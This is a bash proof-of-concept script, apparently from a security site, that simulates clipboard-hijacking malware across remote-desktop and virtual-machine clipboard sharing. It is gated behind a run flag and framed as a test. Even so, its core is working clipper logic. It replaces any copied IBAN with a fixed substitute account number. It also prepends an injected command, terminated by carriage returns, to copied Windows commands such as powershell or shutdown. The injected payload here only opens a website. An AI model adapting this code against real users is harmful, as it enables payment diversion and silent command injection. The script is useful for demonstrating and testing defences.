#!/bin/bash

# PoC - Clipboard Sharing Attack Simulation 
# Version 0.1
# By CyberSecurity.Run

# Malware Attack Simulation from remote (RDP, Citrix etc.), host or virtual guest machine (VirtualBox etc.)


# -- This script is -- only -- for testing purpose. For that reason it is very basic.
# -- Do not perform this test alongside other applications or activities.
# -- This test script uses the Linux "xclip" package. 
# -- If "xclip" is not present, install "xclip" before running this script.

# Test approach
# 1) Copy one of the test data rows from other virtual envirement / remote desktop
# 2) Run the bash script manual (for safety reasons)
# ./clipboard_attack_simulation -a run
# 3) See the clipboard change when pasting

# Test IBAN numbers 
# Warning: Generated data, these can also exist in real life!
# NL80ABNA8592794269
# NL37ABNA8430666915
# NL63INGB1628106735
# NL66INGB5427658955
# NL93RABO8035492543
# NL49RABO9996436217

# Test Windows CMD's
# mstsc
# ipconfig
# ping
# netstat
# tracert
# shutdown
# powershell
# systeminfo

#Attack replacements
new_iban='NL64RABO5206019070'
new_cmd=$'start /d IEXPLORE.EXE www.cybersecurity.run\rcls\r'
new_cmd_view=$'start /d IEXPLORE.EXE www.cybersecurity.run\ncls\n'

# package-test
##################
packages=("xclip")

for pkg in ${packages[@]}; do

    is_pkg_installed=$(dpkg-query -W --showformat='${Status}\n' ${pkg} | grep "install ok installed")

    if [ "${is_pkg_installed}" != "install ok installed" ]; then
		echo "${pkg} is not installed."
		echo -e "Please install missing package first."
    	exit 1            
    fi
done

# flag
##################
while getopts a: flag
do
    case "${flag}" in
        a) attack_run=${OPTARG};;
    esac
done

echo -e "\n#############################\n"

if [ "$attack_run" == "run" ]; then
    echo -e "Attack simulation: On \n"
    
else
    echo -e "Attack simulation: Off \n"
    echo -e "Please read the manual first.\n"
    exit 1
fi

# Simulation of Attack
##################
clipboard_content=`xclip -o -selection clipboard`
echo "Current clipboard content:"
echo "$clipboard_content"
echo -e "\n"

# IBAN
if echo "$clipboard_content" | egrep '([a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16})' >/dev/null ; then
   echo "IBAN: $clipboard_content is changed to: $new_iban"
   echo "$new_iban" | xclip -selection c
fi    

# Windows CMD
if echo "$clipboard_content" | egrep '(mstsc*|ipconfig*|ping*|netstat*|tracert*|shutdown*|powershell*|systeminfo*)' >/dev/null ; then
   new_cmd_with_old=$new_cmd$clipboard_content
   new_cmd_view_with_old=$new_cmd_view$clipboard_content
   echo "$new_cmd_with_old" | xclip -selection c
   echo -e "CMD: $clipboard_content is changed to CMD attack: \n"
   echo "$new_cmd_view_with_old"
fi

echo -e "\n############################# \n\n"
